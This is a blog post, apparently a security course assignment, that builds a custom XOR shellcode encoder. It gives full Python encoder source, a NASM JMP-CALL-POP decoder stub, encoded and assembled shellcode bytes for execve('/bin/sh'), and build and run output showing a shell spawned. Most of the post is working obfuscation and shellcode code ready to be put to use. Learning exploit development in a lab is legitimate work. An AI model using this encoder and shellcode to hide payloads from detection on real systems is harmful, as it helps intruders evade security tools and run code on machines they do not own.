---
layout: single 
classes: wide
title:  "Custom Shellcode Encoder"
date:   2020-03-15 18:54:48 +0800
categories: jekyll update
---

For this 4th assigment, the objective is to create an encoder to obfuscate the shellcode and then the shellcode will be decode itself to execute the decoded/original shellcode.

## Requirements

- Create a custom encoding scheme
- PoC with using execve-stack as the shellcode

## The Encoder

I've created the simple python script to encode the shellcode, the encoder is based on the following method in this order:
- XOR shellcode 4 bytes (dword) size with the custom XOR key (4 bytes) `deafface`
- XOR shellcode byte with the custom byte `0x7`

and the following encoder script will encode the simple `execve("/bin/sh")` shellcode.

{% highlight python linenos %}
#!/usr/bin/env python

# put shellcode here to encode
# http://shell-storm.org/shellcode/files/shellcode-811.php
# execve("/bin/sh")
shellcode = \
("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

res  = ""

# xor key
dkey  = 'deafface' # 4 bytes '\xde\xaf\xfa\xce'
bkey  = 0x7        # byte

def xor_strings(s1, s2):
    return ''.join(format(int(a, 16) ^ int(b, 16), 'x') for a,b in zip(s1,s2))

step = 4
n = 2
for i in range(0, len(shellcode), 4):
    # padding with \x90
    byte    = shellcode[i:step].encode('hex')  + '90'*((8-len(shellcode[i:step].encode('hex') ))/2)

    xor_str = xor_strings(byte, dkey)
    res  += "%s," % ','.join([ hex(int(xor_str[ii-n:ii],16) ^ bkey) for ii in range(len(xor_str),0,-n)])
    step += 4

print "[*] Original Shellcode: \n%s" % "".join([ "0x%s," % 
shellcode.encode('hex')[x:2+x] for x in range(0, len(shellcode.encode('hex')), 2) ])[:-1]
print "[*] Length : %s" % len(shellcode)
print "[+] XOR dword key: 0x%s" % dkey
print "[+] XOR byte key: 0x%s" % bkey
print "[*] Encoded Shellcode: \n%s" % res[:-1]
print "[*] Length : %s" % len(res.split(','))
{% endhighlight %}

### Run the encoder

The encoder will encode the original shellcode to execute `execve("/bin/sh")`. We can see below output the original length of the shellcode is `25` and after encoded it, the length become `29`.
To run the encoder python script:

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/encoder$ python encoder.py 
[*] Original Shellcode: 
0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,
0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
[*] Length : 25
[+] XOR dword key: 0xdeafface
[+] XOR byte key: 0x7
[*] Encoded Shellcode: 
0xa1,0xad,0x68,0xe8,0xa1,0x8e,0x87,0xf6,0xa0,0x9f,0x87,0xb1,0x99,0x1e,0x21,0xb7,0x40,
0xae,0x4a,0x50,0x4,0xf6,0x18,0x38,0x59,0x6d,0x38,0x59
[*] Length : 29
{% endhighlight %}

## The Decoder

The decoder is assembly code and using JMP-CALL-POP method, the decoder is based on the following method to decode the shellcode in this order:
- XOR shellcode with the custom byte `0x7`
- XOR shellcode 4 bytes (dword) with the custom XOR key (4 bytes) `deafface`

{% highlight nasm linenos %}
global _start:

section .text
_start:
    jmp short call_shellcode ; JMP-CALL-POP Method

decoder:
    pop esi                 ; get address of EncodedShellcode
    xor ecx, ecx            ; ecx = 0
    mul ecx                 ; eax = 0
    cdq                     ; edx = 0; xor edx, edx
    mov cl, slen            ; cl = length of encoded shellcode
    mov edi, 0xcefaafde     ; xor key: deafface

decode:
    mov al, byte [esi]      ; al= 1st byte
    mov ah, byte [esi + 1]  ; ah= 2nd byte
    mov bl, byte [esi + 2]  ; bl= 3rd byte
    mov bh, byte [esi + 3]  ; bh= 4th byte
    xor al, 0x7             ; xor 1st byte
    xor ah, 0x7             ; xor 2nd byte
    xor bl, 0x7             ; xor 3rd byte
    xor bh, 0x7             ; xor 4th byte
    mov byte [esi], bh      ; replace the 1st byte with decoded shellcode byte
    mov byte [esi + 1], bl  ; replace the 2nd byte with decoded shellcode byte
    mov byte [esi + 2], ah  ; replace the 3rd byte with decoded shellcode byte
    mov byte [esi + 3], al  ; replace the 4th byte with decoded shellcode byte

    xor dword [esi], edi    ; xor dword with xor key

    add esi, 0x4            ; mov to next 4 byte
    sub ecx, 0x4            ; ecx = length of shellcode - decrease counter by 4
    jnz short decode        ; loop if ecx not zero
    
    jmp short EncodedShellcode ; jmp to esi - decoded shellcode 

call_shellcode:
    call decoder            ; jmp to decoder label and save the address of EncodedShellcode
    EncodedShellcode: db 0xa1,0xad,0x68,0xe8,0xa1,0x8e,0x87,0xf6,0xa0,0x9f,0x87,0xb1,0x99,0x1e,
                      db 0x21,0xb7,0x40,0xae,0x4a,0x50,0x4,0xf6,0x18,0x38,0x59,0x6d,0x38,0x59
    slen equ $-EncodedShellcode ; length of the encoded shellcode
{% endhighlight %}

### Run the decoder

To compile and run the shellcode i've created the helper script `Makefile` to automate the repetitive tasks, please refer to ["Shell Bind TCP Shellcode"](http://localhost:8080/jekyll/update/2020/02/01/1-Shell-Bind-Tcp.html#helper-script) page.

To compile the assembly code: `make target=filename`, and this will do the following tasks:
- Print the size of the shellcode
- Print the shellcode hex format
- Put the shellcode into C wrapper
- Compile the C wrapper

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/encoder$ make target=insertion-decoder
[*] Assembling with nasm...
nasm -f elf32 -o insertion-decoder.o insertion-decoder.nasm

[*] Linking object...
ld -m elf_i386 -o insertion-decoder insertion-decoder.o

[*] Size of Shellcode:
   text    data     bss     dec     hex filename
     93       0       0      93      5d insertion-decoder

[*] Shellcode:
"\xeb\x3a\x5e\x31\xc9\xf7\xe1\x99\xb1\x1c\xbf\xde\xaf\xfa\xce\x8a\x06\x8a\x66\x01\x8a
\x5e\x02\x8a\x7e\x03\x34\x07\x80\xf4\x07\x80\xf3\x07\x80\xf7\x07\x88\x3e\x88\x5e\x01
\x88\x66\x02\x88\x46\x03\x31\x3e\x83\xc6\x04\x83\xe9\x04\x75\xd5\xeb\x05\xe8\xc1\xff
\xff\xff\xa1\xad\x68\xe8\xa1\x8e\x87\xf6\xa0\x9f\x87\xb1\x99\x1e\x21\xb7\x40\xae\x4a
\x50\x04\xf6\x18\x38\x59\x6d\x38\x59"

[*] Compiling shellcode...
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
{% endhighlight %}

To run the shellcode inside C wrapper: `make target=filename run-shellcode`

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/encoder$ make target=insertion-decoder run-shellcode
[*] Running shellcode...
./shellcode
Shellcode Length:  93
$ whoami
kecebong
$ uptime
 21:11:20 up 4 days,  4:39,  1 user,  load average: 0.41, 0.17, 0.09
$ exit
kecebong@ubuntu:~/slae32/assigment/encoder$ 
{% endhighlight %}

## Demo
![image](/assets/img/assigment4.gif)

{% include_relative slae32.html %}
